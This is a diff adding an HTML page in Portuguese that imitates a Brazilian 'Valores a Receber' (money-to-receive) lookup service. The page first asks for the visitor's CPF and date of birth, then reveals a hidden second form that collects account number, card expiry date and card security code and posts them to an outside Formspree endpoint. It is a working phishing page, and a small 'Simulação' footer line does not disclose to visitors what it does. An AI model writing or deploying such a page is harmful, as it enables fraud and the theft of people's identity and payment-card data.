@@ -1,0 +1,119 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Valores a Receber</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+        }
+        header {
+            background-color: #005ca9;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .container h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            background-color: #005ca9;
+            color: white;
+            border: none;
+            padding: 10px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #004280;
+        }
+        footer {
+            text-align: center;
+            padding: 10px;
+            background-color: #333;
+            color: white;
+            margin-top: 20px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Consulta de Valores a Receber</h1>
+    </header>
+
+    <div class="container">
+        <h2>Informe seus dados</h2>
+        <form id="step1" onsubmit="showStep2(event)">
+            <label for="cpf">CPF</label>
+            <input type="text" id="cpf" name="cpf" placeholder="Digite seu CPF" required>
+
+            <label for="data-nascimento">Data de Nascimento</label>
+            <input type="date" id="data-nascimento" name="data-nascimento" required>
+
+            <button type="submit">Próximo</button>
+        </form>
+
+        <form id="step2" class="hidden" action="https://formspree.io/f/xvgonkkv" method="POST">
+            <label for="conta">Conta</label>
+            <input type="text" id="conta" name="conta" placeholder="Digite sua conta" required>
+
+            <label for="data-cartao">Data do Cartão</label>
+            <input type="text" id="data-cartao" name="data-cartao" placeholder="MM/AA" required>
+
+            <label for="codigo-seguranca">Código de Segurança</label>
+            <input type="text" id="codigo-seguranca" name="codigo-seguranca" placeholder="CVC" required>
+
+            <p>Consulte se você tem limite a receber</p>
+
+            <button type="submit">Consultar</button>
+        </form>
+    </div>
+
+    <footer>
+        <p>&copy; 2024 Simulação. Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+        function showStep2(event) {
+            event.preventDefault();
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }
+    </script>
+</body>
+</html>
